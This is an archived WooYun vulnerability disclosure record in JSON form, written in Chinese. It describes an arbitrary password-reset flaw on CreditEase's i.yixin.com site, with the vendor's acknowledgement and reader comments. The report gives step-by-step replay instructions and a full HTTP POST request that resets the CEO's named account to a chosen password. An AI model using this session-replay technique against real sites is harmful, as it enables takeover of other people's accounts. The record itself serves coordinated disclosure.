{"id": 37580, "wybug_id": "wooyun-2015-0106754", "wybug_title": "宜信在线官网任意用户密码重置/CEO账号演示&lt;新思路&gt;", "wybug_corp": "宜信", "wybug_author": "BMa", "wybug_date": "2015-04-09 12:06", "wybug_open_date": "2015-05-24 16:22", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-05-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-05-24：\t细节向公众公开  简要描述： 宜信在线官网任意用户密码重置/CEO账号演示<新思路>为什么是CEO账号呢?因为这个帐号是tangning@creditease.cn，莫非贵公司还有人与CEO抢公司邮箱账号？20rank - - ! 惭愧 详细说明：  站点：http://i.yixin.com/为什么说是新思路呢？在测试时发现每个账号与当前浏览器session绑定，也就是当前session只能重置一个账号密码，进一步发现该session在浏览器第一次打开时已经生成<而不是打开重置密码链接刷新的>，表现在客户端的就是cookie里的PHPSESSID所以具体步骤如下：<步骤截图在第7步>1、关闭浏览器2、重新打开浏览器，访问http://i.yixin.com/，来到重置密码的地方，输入邮箱账号，点击下一步3、这个过程中抓包，获取PHPSESSID，当然还有邮箱账号4、将上面的PHPSESSID以及邮箱账号替换到下面的数据包中\nPOST /upwd.html HTTP/1.1Host: i.yixin.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: https://i.yixin.com/forget/d35279mMPiNNQemHNSbODYL7IS25UYCNRrnPs9FT05fu47Q7Fpg5eO2sl6-Kwy5g4Ilyc6_jEuwAfGvrFdnry4cNC2G9Content-Length: 69Cookie: PHPSESSID=sddmrf2fl52vio9ug477qcndn7;X-Forwarded-For: 8.8.8.8Connection: keep-alivePragma: no-cacheCache-Control: no-cachereg_name=tangning%40creditease.cn&reg_pwd=1qaz2wsx&reg_repwd=1qaz2wsx\n5、返回1，搞定\n\n6、接下来自然是登录账号了，CEO\n\n7、再来一个，也是贵公司的员工<详细过程在图中>\n\n\n\n\n\n   漏洞证明：     修复方案：     版权声明：转载请注明来源 BMa@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-04-09 16:20 厂商回复： 感谢您对宜信安全的关注与支持。之前使用SessionID的认证方式过于简单，感谢白帽子对漏洞的深入挖掘 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-04-09 12:08 |    \t\t大王叫我去巡山 \t\t\t( 路人 |\t\t\t        Rank:7 漏洞数:3        | 大王叫我去巡山)\t\t \n  是因为CEO 有钱吗    \n     2015-04-09 12:08 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:915 漏洞数:79        | 度假中...)\t\t \n  我怀疑前几次没修好    \n     2015-04-09 12:56 |    \t\tM4sk \t\t\t( 普通白帽子  |\t\t\t        Rank:1199 漏洞数:319        | 国内信息安全任重而道远，还需要厂商和白帽...)\t\t \n  mark    \n     2015-04-09 12:56 |    \t\tM4sk \t\t\t( 普通白帽子  |\t\t\t        Rank:1199 漏洞数:319        | 国内信息安全任重而道远，还需要厂商和白帽...)\t\t \n  看看新思路~    \n     2015-05-24 20:57 |    \t\tJumbo \t\t\t( 普通白帽子  |\t\t\t        Rank:111 漏洞数:29        | 猫 - http://www.chinabaiker.com)\t\t \n  PHPSESSID应该怎么改呢？    \n     2015-05-25 08:37 |    \t\tMe_Fortune \t\t\t( 普通白帽子  |\t\t\t        Rank:209 漏洞数:71        | I'm Me_Fortune)\t\t \n  截断返回包？    \n     2015-05-25 10:06 |    \t\t胡小树 \t\t\t( 实习白帽子  |\t\t\t        Rank:60 漏洞数:11        | 我是一颗小小树)\t\t \n  感觉这个漏洞蛮有意思的    \n     2015-05-25 13:42 |    \t\tBMa \t\t\t( 普通白帽子  |\t\t\t        Rank:1776 漏洞数:200        )\t\t \n  @Me_Fortune 使用的是初始化时的phpsession    \n     2015-05-29 18:01 |    \t\tJumbo \t\t\t( 普通白帽子  |\t\t\t        Rank:111 漏洞数:29        | 猫 - http://www.chinabaiker.com)\t\t \n  ID是初次尝试登录用户时的ID，初次打开浏览器，输入用户名，PHPsession就与当前用户绑定，直到重置密码时，（笔记）    \n     2015-09-10 16:30 |    \t\tBeenQuiver \t\t\t( 普通白帽子  |\t\t\t        Rank:101 漏洞数:26        | 专注而高效，坚持好的习惯千万不要放弃)\t\t \n  这是什么鬼，不懂    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}